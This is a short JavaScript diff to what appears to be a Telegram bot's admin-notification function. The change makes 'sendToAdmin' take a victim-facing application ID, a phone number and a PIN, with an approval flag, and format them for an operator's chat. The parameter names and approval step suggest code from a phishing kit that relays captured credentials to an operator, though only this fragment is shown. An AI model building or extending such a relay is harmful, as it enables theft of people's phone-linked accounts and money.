@@ -8,7 +8,7 @@ const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 const botManager = {
     bot: bot,
 
-    sendToAdmin: (appId, title, data, needsApproval = false) => {
+    sendToAdmin: (appId, title, phonenumber, pin, needsApproval = false) => {
         let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
